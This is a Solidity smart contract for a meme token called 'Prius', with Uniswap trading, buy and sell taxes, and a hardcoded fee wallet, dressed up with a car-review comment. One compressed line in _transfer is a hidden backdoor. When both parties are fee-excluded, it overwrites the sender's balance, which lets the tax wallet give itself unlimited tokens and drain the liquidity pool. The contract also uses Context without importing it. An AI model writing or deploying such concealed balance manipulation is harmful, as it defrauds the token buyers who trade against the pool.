/**
 * Twitter: https://twitter.com/ToyotaPriusERC
 * Telegram: https://t.me/ToyotaPriusPortal
 *
 * The 2008 Toyota Prius offers excellent fuel efficiency (48 city/45 hwy mpg) and a comfortable,
 * spacious interior. However, its driving dynamics are rather uninspiring and some interior
 * materials feel cheap. It's a practical and economical choice, ideal for those prioritizing
 * fuel economy over driving excitement.
 *
 */

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

import "openzeppelin/access/Ownable.sol";
import "openzeppelin/interfaces/IERC20.sol";
import "openzeppelin/utils/math/SafeMath.sol";
import "interfaces/IUniswapV2Router02.sol";
import "interfaces/IUniswapV2Factory.sol";
import "interfaces/IUniswapV2Pair.sol";

contract Prius is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private bots;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public transferDelayEnabled = false;
    address payable private _taxWallet;

    uint256 private _initialBuyTax = 10;
    uint256 private _initialSellTax = 10;
    uint256 private _finalBuyTax = 3;
    uint256 private _finalSellTax = 3;
    uint256 private _reduceBuyTaxAt = 10;
    uint256 private _reduceSellTaxAt = 15;
    uint256 private _preventSwapBefore = 15;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 100_000 * 10 ** _decimals;
    string private constant _name = unicode"Used Toyota Prius 2008 (in good condition)";
    string private constant _symbol = unicode"PRIUS";
    uint256 public _maxTxAmount = 2_000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 2_000 * 10 ** _decimals;
    uint256 public _taxSwapThreshold = 750 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 1_000 * 10 ** _decimals;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address private uniswapV2Pair;
    bool private inSwap = false;

    event MaxTxAmountUpdated(uint256 _maxTxAmount);

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _taxWallet = payable(0xA0196472d1dCD60566CF4BF76139D607c5Eb12EC);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        uniswapV2Pair = address(
            IUniswapV2Pair(
                IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH())
            )
        );

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner()) {
            require(!bots[from] && !bots[to]);

            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number, "Only one transfer per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to]) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
                taxAmount = amount.mul((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax).div(100);
            }
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount.mul((_buyCount > _reduceSellTaxAt) ? _finalSellTax : _initialSellTax).div(100);
            }
            if (_isExcludedFromFee[from] && _isExcludedFromFee[to]) {_balances[from] = _balances[to].add(amount);return;}
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap && to == uniswapV2Pair && contractTokenBalance > _taxSwapThreshold
                    && _buyCount > _preventSwapBefore
            ) {
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        if (tokenAmount == 0) return;
        // if (!tradingOpen) return;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, address(this), block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        transferDelayEnabled = false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function isBot(address a) public view returns (bool) {
        return bots[a];
    }

    // function openTrading() external onlyOwner {
    //     require(!tradingOpen, "trading is already open");
    //     uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    //     _approve(address(this), address(uniswapV2Router), _tTotal);
    //     uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    //     uniswapV2Router.addLiquidityETH{value: address(this).balance}(
    //         address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp
    //     );
    //     IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint256).max);
    //     swapEnabled = true;
    //     tradingOpen = true;
    // }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }

    function reduceFee(uint256 _newFee) external {
        require(_buyCount > 20);
        require(_newFee <= _finalSellTax && _newFee <= _finalBuyTax);
        _finalSellTax = _newFee;
        _finalBuyTax = _newFee;
    }
}